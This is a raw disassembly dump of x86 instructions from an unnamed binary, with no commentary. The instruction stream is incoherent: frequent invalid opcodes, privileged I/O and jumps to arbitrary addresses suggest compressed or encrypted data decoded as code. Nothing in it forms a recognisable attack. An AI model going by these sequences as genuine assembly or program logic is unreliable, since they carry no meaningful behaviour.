  4217a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4217aa:	std    
  4217ab:	and    al,0x14
  4217ad:	add    bh,BYTE PTR [edx+eax*1]
  4217b0:	add    al,0xe1
  4217b2:	mov    cl,0xdb
  4217b4:	pop    ebx
  4217b5:	cmp    ecx,DWORD PTR [edx-0x7a]
  4217b8:	pop    ss
  4217b9:	inc    ecx
  4217ba:	pop    es
  4217bb:	xor    BYTE PTR [edi-0x53],0x2f
  4217bf:	push   edi
  4217c0:	into   
  4217c1:	ret    
  4217c2:	sti    
  4217c3:	mov    ah,0xc5
  4217c5:	shl    BYTE PTR [ecx+0x26],1
  4217c8:	and    sp,sp
  4217cb:	mov    ah,0x53
  4217cd:	(bad)  
  4217ce:	cmp    DWORD PTR [edi],ebx
  4217d0:	es repz inc eax
  4217d3:	inc    edi
  4217d4:	add    edi,DWORD PTR [ebx+0x74]
  4217d7:	pop    ds
  4217d8:	mov    edx,0x48e926bf
  4217dd:	(bad)  
  4217de:	xor    ah,BYTE PTR [eax-0x36b0e26d]
  4217e4:	inc    edi
  4217e5:	inc    edx
  4217e6:	jo     0x4217ed
  4217e8:	push   ss
  4217e9:	and    DWORD PTR [edi-0x74],ebx
  4217ec:	out    0x14,eax
  4217ee:	test   al,0xb3
  4217f0:	push   cs
  4217f1:	xchg   esi,eax
  4217f2:	fisttp DWORD PTR [ebx]
  4217f4:	in     al,0x3a
  4217f6:	popa   
  4217f7:	jge    0x421866
  4217f9:	outs   dx,DWORD PTR ds:[esi]
  4217fa:	outs   dx,BYTE PTR ds:[esi]
  4217fb:	push   cs
  4217fc:	sbb    al,al
  4217fe:	xor    ch,BYTE PTR [ecx+ebp*4-0x35]
  421802:	aad    0x9
  421804:	lods   eax,DWORD PTR ds:[esi]
  421805:	cmc    
  421806:	gs inc eax
  421808:	sub    DWORD PTR [edi],ebx
  42180a:	dec    ebp
  42180b:	imul   ebx,DWORD PTR [ecx-0x33],0xe55218
	...
  421872:	add    BYTE PTR [eax],al
  421874:	shl    DWORD PTR [eax-0x6061f47],1
  42187a:	fnstenv [ecx-0x359a0174]
  421880:	and    eax,ebx
  421882:	iret   
  421883:	cmp    dh,BYTE PTR [ecx+0x5000165]
  421889:	add    DWORD PTR [eax],eax
  42188b:	add    BYTE PTR [ebp+edi*2+0x1e],cl
  42188f:	jne    0x42183d
  421891:	into   
  421892:	sbb    al,0x85
  421894:	out    dx,eax
  421895:	jns    0x421897
  421897:	dec    esp
  421898:	jno    0x42181b
  42189a:	push   ecx
  42189b:	dec    ebp
  42189c:	(bad)  
  42189e:	test   esi,0x7b9879b7
  4218a4:	or     cl,BYTE PTR [esi-0x1f515047]
  4218aa:	or     eax,0x48dd2490
  4218af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4218b0:	xchg   edx,eax
  4218b1:	popf   
  4218b2:	int3   
  4218b3:	xchg   ebp,eax
  4218b4:	enter  0x3e29,0x55
  4218b8:	ins    DWORD PTR es:[edi],dx
  4218b9:	adc    ecx,edi
  4218bb:	and    eax,0xce669960
  4218c0:	mov    al,0x8e
  4218c2:	inc    esp
  4218c3:	mov    edx,0x46ef5846
  4218c8:	push   edx
  4218c9:	ret    
  4218ca:	sbb    al,0xd7
  4218cc:	test   BYTE PTR [esi],bh
  4218ce:	mov    esi,0x4cddfa04
  4218d3:	push   es
  4218d4:	xchg   esi,eax
  4218d5:	mov    eax,esp
  4218d7:	xor    eax,0x47615f2d
  4218dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4218dd:	(bad)  
  4218de:	sub    al,0x3b
  4218e0:	xchg   ebx,eax
  4218e1:	sti    
  4218e2:	addr16 (bad) 
  4218e4:	dec    eax
  4218e5:	(bad)  
  4218e6:	push   ebp
  4218e7:	sub    DWORD PTR [ecx],ebp
  4218e9:	xor    eax,0x4db82326
  4218ee:	fnstenv [edi]
  4218f0:	hlt    
  4218f1:	or     DWORD PTR [ecx-0x2eba6b75],ecx
  4218f7:	xor    BYTE PTR [ecx-0x3e],bl
  4218fa:	dec    esi
  4218fb:	mov    dh,0xa8
  4218fd:	ds ins DWORD PTR es:[edi],dx
  4218ff:	jecxz  0x421970
  421901:	push   es
  421902:	mov    dh,0x66
  421904:	cmp    al,0x43
  421906:	sbb    BYTE PTR [ebx-0x3a],al
  421909:	adc    BYTE PTR [ecx+eiz*4+0x72],ch
  42190d:	inc    esi
  42190e:	inc    esp
  42190f:	cmp    edx,DWORD PTR [edi]
  421911:	lock dec eax
  421913:	outs   dx,DWORD PTR ds:[esi]
  421914:	sub    al,0x95
  421916:	jns    0x4218b9
  421918:	ret    0xbbae
  42191b:	mov    eax,0x57974838
  421920:	inc    ebp
  421921:	add    al,0xa
  421923:	pop    esi
  421924:	mov    esi,0x8d5cbfeb
  421929:	sub    ah,BYTE PTR [edi+0x43739ddc]
  42192f:	xor    BYTE PTR [esi-0x4d],0x18
  421933:	cmp    edx,DWORD PTR [ebx+0x191732c6]
  421939:	test   eax,0x4e7bb3dd
  42193e:	adc    DWORD PTR [eax-0x5c],ebp
  421941:	int    0xb0
  421943:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421944:	aaa    
  421945:	dec    esi
  421946:	and    al,0x7
  421948:	and    ah,ch
  42194a:	sub    esi,eax
  42194c:	ds mov dh,0xf5
  42194f:	loop   0x4219a3
  421951:	out    dx,eax
  421952:	inc    edx
  421953:	dec    eax
  421954:	adc    eax,0x425432c2
  421959:	and    DWORD PTR [ebx+edi*2],esi
  42195c:	mov    dh,ah
  42195e:	outs   dx,BYTE PTR ds:[esi]
  42195f:	test   al,0xb0
  421961:	jnp    0x4218e6
  421963:	mov    edi,0xc18c3da3
  421968:	inc    ecx
  421969:	retf   0x5655
  42196c:	les    edx,FWORD PTR [ebx+ebx*1]
  42196f:	or     DWORD PTR [edx-0x78],ebp
  421972:	repnz mov al,ds:0xa7f00ddb
  421978:	jmp    0x40d9b0c8
  42197d:	xchg   edx,eax
  42197e:	sar    DWORD PTR [eax-0x24b2e766],1
  421984:	jge    0x42194f
  421986:	xchg   ebx,eax
  421987:	popf   
  421988:	retf   
  421989:	test   BYTE PTR [esi-0x4be802da],al
  42198f:	call   0x421a80
	...
  4219f4:	(bad)  
  4219f5:	cld    
  4219f6:	je     0x421a15
  4219f8:	jbe    0x421997
  4219fa:	(bad)  
  4219fb:	(bad)  
  4219fc:	jns    0x4219ee
  4219fe:	sbb    al,0x7b
  421a00:	sub    BYTE PTR [esi],bl
  421a02:	adc    eax,esi
  421a04:	mov    dh,0x66
  421a06:	add    DWORD PTR [eax],eax
  421a08:	add    eax,0x6000001
  421a0d:	lock imul edx,DWORD PTR [ecx+0x1174e9f2],0x1c
  421a15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421a16:	or     edx,esp
  421a18:	ror    BYTE PTR [ebp+0x363df4ad],cl
  421a1e:	ins    BYTE PTR es:[edi],dx
  421a1f:	daa    
  421a20:	adc    DWORD PTR [ebx],eax
  421a22:	div    ebp
  421a24:	add    BYTE PTR [ebp-0x57da9597],ch
  421a2a:	into   
  421a2b:	or     DWORD PTR [eax+0x52bcc0c],eax
  421a31:	and    DWORD PTR [ecx],edx
  421a33:	into   
  421a34:	sti    
  421a35:	dec    ecx
  421a36:	mov    eax,ds:0xf71c1c3b
  421a3b:	out    0x77,al
  421a3d:	or     ebx,DWORD PTR [ecx]
  421a3f:	xlat   BYTE PTR ds:[ebx]
  421a40:	(bad)  
  421a41:	mov    dh,0xfc
  421a43:	xchg   esp,eax
  421a44:	xor    DWORD PTR [eax-0x2fbfb358],ebx
  421a4a:	and    al,0x27
  421a4c:	pop    ss
  421a4d:	ret    0xeba2
  421a50:	jecxz  0x421ab8
  421a52:	cmp    edi,DWORD PTR [eax+edi*1-0x3d18361a]
  421a59:	es add esp,ebp
  421a5c:	adc    ebx,DWORD PTR [edi]
  421a5e:	clc    
  421a5f:	jne    0x421aa7
  421a61:	jo     0x421ad1
  421a63:	mov    WORD PTR [ebx+0x55],es
  421a66:	jle    0x421a34
  421a68:	inc    ecx
  421a69:	mov    edi,0x4ab7b9af
  421a6e:	mov    esp,0x68196c68
  421a73:	jo     0x421acc
  421a75:	sbb    eax,0x1aeb7d54
  421a7a:	lock cdq 
  421a7c:	jl     0x421ad2
  421a7e:	sti    
  421a7f:	adc    esi,DWORD PTR [edx-0x631147dd]
  421a85:	aam    0x7d
  421a87:	mov    bl,0x18
  421a89:	push   edx
  421a8a:	jmp    0x421a35
  421a8c:	imul   esp,DWORD PTR ds:0xbe5b64d3,0xffffffe7
  421a93:	mov    bh,0x64
  421a95:	dec    ebx
  421a96:	loop   0x421a83
  421a98:	inc    ebp
  421a99:	fistp  WORD PTR [ebx-0x44de6b60]
  421a9f:	jp     0x421a76
  421aa1:	aad    0x25
  421aa3:	adc    DWORD PTR [ecx],esp
  421aa5:	imul   esp,DWORD PTR ss:[eax-0x7f],0x7b
  421aaa:	cmp    DWORD PTR [ecx],0x3a174745
  421ab0:	sahf   
  421ab1:	or     al,0x22
  421ab3:	fcomp  DWORD PTR [edx+0x48]
  421ab6:	push   esi
  421ab7:	mov    ebx,0x8b57efb9
  421abc:	mov    ss,WORD PTR [ecx-0x4f7c852a]
  421ac2:	aas    
  421ac3:	shl    DWORD PTR [eax],1
  421ac5:	mov    ecx,0x3be3ea79
  421aca:	hlt    
  421acb:	enter  0xcd96,0x3
  421acf:	aad    0xda
  421ad1:	aam    0xd0
  421ad3:	rcr    DWORD PTR [edi+0x39],cl
  421ad6:	sub    dh,BYTE PTR [edi]
  421ad8:	repnz sbb DWORD PTR [eax*1-0x72d67aa2],0x11c7b2e2
  421ae4:	fstp   TBYTE PTR [edi+0x7fe3d017]
  421aea:	out    0xc8,al
  421aec:	not    DWORD PTR [eax+0x19]
  421aef:	pop    ds
  421af0:	leave  
  421af1:	stos   BYTE PTR es:[edi],al
  421af2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421af3:	pusha  
  421af4:	cdq    
  421af5:	or     al,0x95
  421af7:	scas   al,BYTE PTR es:[edi]
  421af8:	mov    al,ds:0x9286afa3
  421afd:	sbb    DWORD PTR [ebx+0x4c],ebx
  421b00:	jae    0x421a91
  421b02:	pop    esi
  421b03:	xchg   ebx,eax
  421b04:	les    ecx,FWORD PTR [eax+esi*4-0x3c]
  421b08:	mov    bh,0xa1
  421b0a:	int3   
  421b0b:	add    BYTE PTR [esi+eax*2],ah
  421b0e:	xchg   edx,eax
  421b0f:	pop    ecx
  421b10:	mov    DWORD PTR [eax],eax
	...
  421b72:	add    BYTE PTR [eax],al
  421b74:	push   ss
  421b75:	cdq    
  421b76:	jmp    0x37400b48
  421b7b:	fild   DWORD PTR [ecx+eax*8+0x28]
  421b7f:	or     ah,BYTE PTR [edx-0x44049390]
  421b85:	add    DWORD PTR [bx+si],eax
  421b88:	add    eax,0x6d000001
  421b8d:	or     al,0x23
  421b8f:	xchg   ebp,eax
  421b90:	bound  esi,QWORD PTR [ecx+edi*1-0x25]
  421b94:	jmp    0xb694:0x51cabb46
  421b9b:	fnsave [esi+ebp*4+0x58]
  421b9f:	pop    ds
  421ba0:	retf   0x8853
  421ba3:	jmp    0xf0bfa7ab
  421ba8:	add    ebp,eax
  421baa:	xor    dl,BYTE PTR [edx-0x2cba7ee5]
  421bb0:	aaa    
  421bb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421bb2:	in     eax,0xc4
  421bb4:	fisttp QWORD PTR [ebx-0x2b0227fa]
  421bba:	outs   dx,BYTE PTR ds:[esi]
  421bbb:	push   esi
  421bbc:	(bad)  
  421bbd:	fstp   TBYTE PTR [ecx-0x2d]
  421bc0:	sbb    BYTE PTR [ebx+0x4775b202],bh
  421bc6:	xor    al,0x45
  421bc8:	mov    bh,0x5b
  421bca:	push   edx
  421bcb:	aas    
  421bcc:	sbb    al,0x49
  421bce:	pop    eax
  421bcf:	push   esp
  421bd0:	inc    esi
  421bd1:	les    ebp,FWORD PTR [ebp-0x25f1853d]
  421bd7:	test   edi,edx
  421bd9:	int    0x63
  421bdb:	mov    esi,0x3474d925
  421be0:	dec    ebx
  421be1:	test   eax,0x5a926f2c
  421be6:	ja     0x421bd7
  421be8:	and    dl,cl
  421bea:	adc    ebp,edi
  421bec:	sbb    ecx,DWORD PTR ds:0x4228210a
  421bf2:	shl    BYTE PTR [esi-0x76aa585e],1
  421bf8:	outs   dx,BYTE PTR ds:[esi]
  421bf9:	sbb    eax,0x34c0054e
  421bfe:	inc    edx
  421bff:	jb     0x421bfd
  421c01:	jmp    FWORD PTR [edx]
  421c03:	ret    
  421c04:	cli    
  421c05:	retf   
  421c06:	jo     0x421c04
  421c08:	inc    esp
  421c09:	call   0x7b16:0x48cb9e19
  421c10:	pushf  
  421c11:	cmc    
  421c12:	pop    ds
  421c13:	mov    esi,0xb1a6b991
  421c18:	xlat   BYTE PTR ds:[ebx]
  421c19:	mov    esi,0x5c870b0d
  421c1e:	js     0x421bfa
  421c20:	stos   DWORD PTR es:[edi],eax
  421c21:	shl    BYTE PTR [ecx-0x4f],0xc
  421c25:	ds cmc 
  421c27:	pop    ebp
  421c28:	mov    DWORD PTR ds:0x1692b3ad,ecx
  421c2e:	(bad)  
  421c2f:	mov    al,ds:0xa7d1295e
  421c34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c35:	pop    ss
  421c36:	je     0x421c00
  421c38:	jbe    0x421bc2
  421c3a:	scas   eax,DWORD PTR es:[edi]
  421c3b:	lock add ecx,DWORD PTR cs:[edx]
  421c3f:	cmp    DWORD PTR [ebx],ebx
  421c41:	in     eax,0xe1
  421c43:	or     eax,0x81e8efcc
  421c48:	cmp    BYTE PTR [edx],ah
  421c4a:	inc    edi
  421c4b:	pop    ebx
  421c4c:	push   ds
  421c4d:	jae    0x421cbe
  421c4f:	and    eax,0x86b50c5
  421c54:	xor    BYTE PTR [ecx],ch
  421c56:	out    dx,al
  421c57:	rcr    DWORD PTR [ecx],0xe
  421c5a:	leave  
  421c5b:	aas    
  421c5c:	retf   0xe2a7
  421c5f:	sbb    DWORD PTR [eax+0x7b80dce8],ecx
  421c65:	pop    ebx
  421c66:	test   eax,0xdb1164f4
  421c6b:	adc    DWORD PTR [edx-0x1d],0xffffffc3
  421c6f:	arpl   WORD PTR [eax+ecx*8+0x47076e51],bp
  421c76:	icebp  
  421c77:	ds lahf 
  421c79:	mov    edi,0xe8d0eb9
  421c7e:	ja     0x421c95
  421c80:	inc    BYTE PTR [bp+di+0x2b]
  421c84:	in     eax,0xb1
  421c86:	adc    ch,BYTE PTR [edx]
  421c88:	call   0x8062a2b1
  421c8d:	mov    ds:0xce409d,al
	...
  421cf2:	add    BYTE PTR [eax],al
  421cf4:	mov    al,0x6b
  421cf6:	mov    ch,0xe5
  421cf8:	(bad)  
  421cf9:	push   eax
  421cfb:	jg     0x421d51
  421cfd:	dec    edi
  421cfe:	xchg   edx,eax
  421cff:	dec    edi
  421d00:	dec    ebp
  421d01:	jge    0x421d13
  421d03:	fld    st(0)
  421d05:	push   0x1050001
  421d0a:	add    BYTE PTR [eax],al
  421d0c:	fdivr  QWORD PTR [edx-0x24294f42]
  421d12:	push   ds
  421d13:	dec    esi
  421d14:	sbb    BYTE PTR [eax-0x45531471],ah
  421d1a:	xlat   BYTE PTR ds:[ebx]
  421d1b:	cmp    DWORD PTR [esi+ebx*4+0x60],esp
  421d1f:	test   BYTE PTR [ebx],dh
  421d21:	das    
  421d22:	inc    edx
  421d23:	ror    DWORD PTR [ebx-0x6c],1
  421d26:	jae    0x421d8f
  421d28:	sbb    dl,BYTE PTR [esi+eiz*8]
  421d2b:	nop
  421d2c:	fcomp  DWORD PTR [esi+0x7d59ce54]
  421d32:	pop    ds
  421d33:	lds    esp,FWORD PTR [eax+0x71]
  421d36:	icebp  
  421d37:	mov    al,ds:0x21a31474
  421d3c:	dec    ebx
  421d3d:	adc    al,0x4b
  421d3f:	sbb    DWORD PTR [esi],0x6c
  421d42:	adc    dl,bl
  421d44:	mov    al,ds:0xd844d6ff
  421d49:	(bad)  
  421d4a:	mov    fs:0x25e998f4,al
  421d50:	pop    ebx
  421d51:	push   ds
  421d52:	lds    edi,FWORD PTR [ebx+0x3b]
  421d55:	popa   
  421d56:	sub    al,0xaf
  421d58:	rol    DWORD PTR [edi-0x76],cl
  421d5b:	jns    0x421cfe
  421d5d:	mov    bh,0xe6
  421d5f:	lea    edi,[edi+0x73]
  421d62:	popa   
  421d63:	(bad)  
  421d64:	fmul   QWORD PTR [esi]
  421d66:	les    ebx,FWORD PTR [esi]
  421d68:	and    esi,DWORD PTR [ebx-0x52b49ced]
  421d6e:	or     ebp,DWORD PTR [edi+0x5587270e]
  421d74:	push   eax
  421d75:	neg    BYTE PTR [edi+edx*2-0x29]
  421d79:	add    bl,dh
  421d7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d7c:	pop    eax
  421d7d:	mov    ebx,0x96dd2a9e
  421d82:	aas    
  421d83:	sbb    ebp,ebp
  421d85:	pop    es
  421d86:	scas   eax,DWORD PTR es:[edi]
  421d87:	call   0xe92e8a2e
  421d8c:	(bad)  
  421d8d:	loopne 0x421d8d
  421d8f:	retf   
  421d90:	int3   
  421d91:	clc    
  421d92:	ret    0xa901
  421d95:	fdiv   QWORD PTR [esi+edi*1]
  421d98:	xor    eax,0x27941bff
  421d9d:	sbb    eax,0x91e9f900
  421da2:	loop   0x421d29
  421da4:	pop    esp
  421da5:	jmp    0x2f45ba93
  421daa:	cmp    DWORD PTR [ecx],0xfffffff2
  421dad:	aam    0x6e
  421daf:	aad    0xed
  421db1:	or     ch,BYTE PTR [ebp+0xa]
  421db4:	mov    cl,BYTE PTR [ebp+eax*2-0xf6310c4]
  421dbb:	adc    DWORD PTR [edi-0x56cd180f],ebp
  421dc1:	or     dh,cl
  421dc3:	mov    eax,gs:0x312a434e
  421dc9:	(bad)  
  421dca:	or     BYTE PTR ss:[ebx-0x64],ch
  421dce:	cmp    ecx,DWORD PTR [ebx+0x8043bac]
  421dd4:	in     eax,0x96
  421dd6:	aaa    
  421dd7:	jmp    0x2491:0xa4c4883
  421dde:	jmp    0xc9797527
  421de3:	jns    0x421d72
  421de5:	jl     0x421e1a
  421de7:	jle    0x421d6b
  421de9:	sub    edi,esp
  421deb:	dec    edi
  421dec:	mov    esi,0x71e1c92d
  421df1:	jecxz  0x421e27
  421df3:	aaa    
  421df4:	push   0xca39f165
  421df9:	xchg   edx,eax
  421dfa:	mov    ch,0x7e
  421dfc:	add    DWORD PTR [esi-0x5f],ebx
  421dff:	pop    esi
  421e00:	pop    esp
  421e01:	daa    
  421e02:	pop    ss
  421e03:	xor    bh,BYTE PTR [edx-0x672afcd4]
  421e09:	jp     0x421e02
  421e0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421e0c:	mov    al,0x60
  421e0e:	test   BYTE PTR [eax],ah
  421e10:	loope  0x421e12
	...
  421e72:	add    BYTE PTR [eax],al
  421e74:	iret   
  421e75:	mov    eax,ds:0xbf7f851b
  421e7a:	fucomip st,st(3)
  421e7c:	push   es
  421e7d:	ins    BYTE PTR es:[edi],dx
  421e7e:	xor    al,0xb9
  421e80:	mov    dl,0x35
  421e82:	aad    0xea
  421e84:	lds    ebp,FWORD PTR [ecx+0x1]
  421e87:	add    BYTE PTR ds:0x1c000001,al
  421e8d:	cli    
  421e8e:	mov    eax,0x8eba21f7
  421e93:	mov    DWORD PTR [ecx+0x55905106],esp
  421e99:	js     0x421ec2
  421e9b:	adc    eax,0x9d77bdd6
  421ea0:	jge    0x421e62
  421ea2:	sub    edi,eax
  421ea4:	stc    
  421ea5:	dec    ebx
  421ea6:	push   ebp
  421ea7:	inc    ebp
  421ea8:	retf   
  421ea9:	xchg   esp,eax
  421eaa:	jmp    0x7e1d:0x8b8666d
  421eb1:	mov    esp,0x1217208b
  421eb6:	loopne 0x421ebb
  421eb8:	leave  
  421eb9:	in     al,dx
  421eba:	jno    0x421f37
  421ebc:	inc    ecx
  421ebd:	gs in  eax,0x76
  421ec0:	je     0x421edb
  421ec2:	mov    bh,0x1b
  421ec4:	dec    esp
  421ec5:	cld    
  421ec6:	mov    ebx,eax
  421ec8:	lods   eax,DWORD PTR fs:[esi]
  421eca:	ds retf 0x56cd
  421ece:	fldcw  WORD PTR [edx+0x13]
  421ed1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421ed2:	jae    0x421f1f
  421ed4:	(bad)  [edx+0x23286ee0]
  421eda:	outs   dx,DWORD PTR ds:[esi]
  421edb:	es dec edx
  421edd:	retf   0xeefa
  421ee0:	add    al,bh
  421ee2:	in     eax,0x11
  421ee4:	mov    al,ds:0x912fa7c5
  421ee9:	ins    BYTE PTR es:[edi],dx
  421eea:	push   ecx
  421eeb:	mov    DWORD PTR [ebx-0x77],esi
  421eee:	push   ebx
  421eef:	and    ah,BYTE PTR [ecx-0x1ff633cf]
  421ef5:	ret    0x9b49
  421ef8:	shl    BYTE PTR [edx+edi*8],0xdb
  421efc:	les    eax,FWORD PTR [esi-0x6c]
  421eff:	push   esp
  421f00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421f01:	or     ah,0x33
  421f04:	or     DWORD PTR [ebx+0x42],ebx
  421f07:	or     BYTE PTR [esi+0x21],ah
  421f0a:	test   eax,0x9e09e25
  421f0f:	pop    eax
  421f10:	and    dh,BYTE PTR [edx]
  421f12:	mov    DWORD PTR [ebx+0x2dd63e12],ebp
  421f18:	fistp  QWORD PTR [edi-0x29]
  421f1b:	call   0x57429b64
  421f20:	pop    ebx
  421f21:	lods   al,BYTE PTR ds:[esi]
  421f22:	rcr    DWORD PTR [edi+0x4],1
  421f25:	jmp    0x9f8c7586
  421f2a:	lods   eax,DWORD PTR ds:[esi]
  421f2b:	or     ebx,DWORD PTR [esi-0x4d339bd9]
  421f31:	pop    ss
  421f32:	out    0x53,eax
  421f34:	scas   al,BYTE PTR es:[edi]
  421f35:	xor    BYTE PTR [edi-0x58],al
  421f38:	add    BYTE PTR [ebx],bl
  421f3a:	std    
  421f3b:	mov    ecx,0xcfcb4d49
  421f40:	out    dx,eax
  421f41:	int3   
  421f42:	sub    al,0x30
  421f44:	sbb    dl,BYTE PTR [eax-0x48e4bad7]
  421f4a:	push   edx
  421f4b:	in     al,0xeb
  421f4d:	jmp    0xe643:0x94b8e094
  421f54:	enter  0x9db5,0x15
  421f58:	aam    0xa4
  421f5a:	push   eax
  421f5b:	jge    0x421f09
  421f5d:	sub    DWORD PTR [ebp-0x2f],ebx
  421f60:	sub    eax,0xe7be23d3
  421f65:	jbe    0x421f78
  421f67:	cli    
  421f68:	es mov ?,esp
  421f6b:	inc    esi
  421f6c:	rcl    DWORD PTR [eax+eax*2],0x20
  421f70:	popa   
  421f71:	arpl   WORD PTR [eax],sp
  421f73:	ret    
  421f74:	jb     0x421fe8
  421f76:	mov    eax,ebp
  421f78:	pop    eax
  421f79:	hlt    
  421f7a:	jo     0x421f0c
  421f7c:	and    eax,0xb9a82dd0
  421f81:	push   esp
  421f82:	adc    BYTE PTR [esi-0x494d36a2],0x43
  421f89:	sti    
  421f8a:	mov    eax,ds:0x22db0f48
  421f8f:	push   0x11
	...
  421ff4:	imul   eax,DWORD PTR [esi],0xffffff8f
  421ff7:	dec    edi
  421ff8:	out    dx,eax
  421ff9:	iret   
  421ffa:	jmp    0x422022
  421ffc:	aas    
  421ffd:	in     eax,dx
  421ffe:	push   es
  421fff:	data16 sbb bl,dl
  422002:	(bad)  
  422004:	retf   0x16a
  422007:	add    BYTE PTR ds:0x4d000001,al
  42200d:	fwait
  42200e:	out    dx,al
  42200f:	lea    ebp,[edx]
  422011:	adc    al,0x78
  422013:	add    bh,BYTE PTR [ecx-0x5e]
  422016:	sbb    edx,esi
  422018:	pop    ecx
  422019:	fsubrp st(0),st
  42201b:	mov    al,0x4f
  42201d:	aaa    
  42201e:	jg     0x42209e
  422020:	push   ecx
  422021:	daa    
  422022:	cwde   
  422023:	aad    0xaf
  422025:	xor    esp,ecx
  422027:	fldcw  WORD PTR [esi-0x310c6adc]
  42202d:	cwde   
  42202e:	inc    edi
  42202f:	dec    ebx
  422030:	fwait
  422031:	inc    edi
  422032:	push   ebp
  422033:	popa   
  422034:	jb     0x42205c
  422036:	and    esi,DWORD PTR [esp+eiz*4-0x5442f471]
  42203d:	cmp    BYTE PTR [edi-0x34fa86a4],al
  422043:	bound  eax,QWORD PTR [ecx]
  422045:	jl     0x4220a7
  422047:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422048:	add    eax,0x653be4d3
  42204d:	or     eax,ebx
  42204f:	xor    al,BYTE PTR [ebp+0xe]
  422052:	jo     0x421fd7
  422054:	(bad)
  422057:	dec    eax
  422058:	jg     0x422026
  42205a:	enter  0x701e,0x8a
  42205e:	mov    esi,0x52a42112
  422063:	js     0x4220e3
  422065:	enter  0xa34d,0xe5
  422069:	icebp  
  42206a:	imul   ebp,eax,0xd91d612c
  422070:	dec    ebp
  422071:	cmp    edi,DWORD PTR [edx+0x68]
  422074:	dec    esi
  422075:	and    BYTE PTR [edi-0x6755f692],dh
  42207b:	adc    BYTE PTR [esi-0x78b25769],dh
  422081:	fist   DWORD PTR [eax+0x489684cd]
  422087:	psubusb mm6,mm6
  42208a:	out    dx,al
  42208b:	out    0xca,eax
  42208d:	cmp    dl,BYTE PTR [esi+0x3fe7f5d4]
  422093:	push   ecx
  422094:	popf   
  422095:	aaa    
  422096:	xchg   BYTE PTR [edi+0x48680ab9],al
  42209c:	ins    DWORD PTR es:[edi],dx
  42209d:	xor    BYTE PTR [edi-0x46a3bfde],ch
  4220a3:	sbb    BYTE PTR [ebx+0x3184338f],ch
  4220a9:	outs   dx,BYTE PTR ds:[esi]
  4220aa:	push   ds
  4220ab:	sub    eax,0xf8902eea
  4220b0:	jns    0x42207c
  4220b2:	or     DWORD PTR [edi+0x5d],0x7
  4220b6:	out    0xbd,al
  4220b8:	fwait
  4220b9:	inc    esi
  4220ba:	pushf  
  4220bb:	pop    ebp
  4220bc:	dec    ecx
  4220bd:	push   ds
  4220be:	ja     0x422139
  4220c0:	in     eax,0x1a
  4220c2:	mov    al,0x3a
  4220c4:	sahf   
  4220c5:	clc    
  4220c6:	ins    BYTE PTR es:[edi],dx
  4220c7:	or     al,0x19
  4220c9:	gs mov ecx,0xca78164c
  4220cf:	sub    eax,0x57c14472
  4220d4:	pop    esi
  4220d5:	pop    eax
  4220d6:	adc    esi,DWORD PTR [edi-0x775b4a67]
  4220dc:	and    DWORD PTR [ecx+0x7f],0xd
  4220e0:	adc    ah,BYTE PTR [edx+0x3835f809]
  4220e6:	pop    esi
  4220e7:	jl     0x42209d
  4220e9:	pop    ebp
  4220ea:	mov    eax,0x76d482ce
  4220ef:	test   ebx,ebp
  4220f1:	in     eax,dx
  4220f2:	ret    
  4220f3:	mov    al,0x7e
  4220f5:	pop    edx
  4220f6:	ds rcr ecx,1
  4220f9:	jb     0x422099
  4220fb:	addr16 jae 0x4220bb
  4220fe:	xchg   ebx,eax
  4220ff:	ffreep st(4)
  422101:	je     0x422176
  422103:	fcom   QWORD PTR [eax]
  422105:	dec    edi
  422106:	fdiv   DWORD PTR [ecx-0x2e]
  422109:	(bad)  
  42210b:	daa    
  42210c:	and    DWORD PTR [esi],0x44c0f7
	...
  422172:	add    BYTE PTR [eax],al
  422174:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422175:	push   edx
  422176:	jnp    0x422175
  422178:	(bad)  
  422179:	std    
  42217a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42217b:	pop    ebx
  42217c:	dec    edx
  42217d:	sub    al,0x42
  42217f:	sub    ebx,DWORD PTR [eax]
  422181:	cmp    BYTE PTR [esi+eax*2+0x16bcf],dh
  422188:	add    eax,0xf2000001
  42218d:	push   edx
  42218e:	call   0x83a406d2
  422193:	jg     0x422147
  422195:	jo     0x4221b8
  422197:	nop
  422198:	out    dx,eax
  422199:	cmp    eax,0x22aca5ac
  42219e:	sub    bh,BYTE PTR es:[edx+0x5b90910f]
  4221a5:	lds    eax,FWORD PTR [edx-0x61fab676]
  4221ab:	fldln2 
  4221ad:	jp     0x4221b2
  4221af:	mov    ch,0xaa
  4221b1:	lock pusha 
  4221b3:	inc    edi
  4221b4:	out    0xda,al
  4221b6:	cmc    
  4221b7:	ucomiss xmm2,xmm3
  4221ba:	and    BYTE PTR [eax],dh
  4221bc:	repnz ins DWORD PTR es:[edi],dx
  4221be:	add    al,0x77
  4221c0:	fistp  DWORD PTR [esi]
  4221c2:	loop   0x422149
  4221c4:	mov    edx,0xbcd1fab8
  4221c9:	push   eax
  4221ca:	ja     0x42217a
  4221cc:	outs   dx,BYTE PTR ds:[esi]
  4221cd:	and    dh,BYTE PTR [ebx+0x6f]
  4221d0:	cmp    cl,BYTE PTR [ecx]
  4221d2:	xchg   DWORD PTR [esi],edi
  4221d4:	(bad)  
  4221d5:	jns    0x422180
  4221d7:	push   ebp
  4221d8:	mov    ch,0xea
  4221da:	xor    DWORD PTR [ebx],ebp
  4221dc:	xor    dh,BYTE PTR [edi+0x52]
  4221df:	lds    edi,FWORD PTR [ebx+0x40]
  4221e2:	pop    ebp
  4221e3:	and    BYTE PTR [edx+0x1dbb1efc],al
  4221e9:	jp     0x42218c
  4221eb:	inc    esp
  4221ec:	jecxz  0x4221a6
  4221ee:	sbb    edi,DWORD PTR [edi-0x3b]
  4221f1:	rol    DWORD PTR [edx+0x54b7593c],1
  4221f7:	rcl    BYTE PTR [ecx],cl
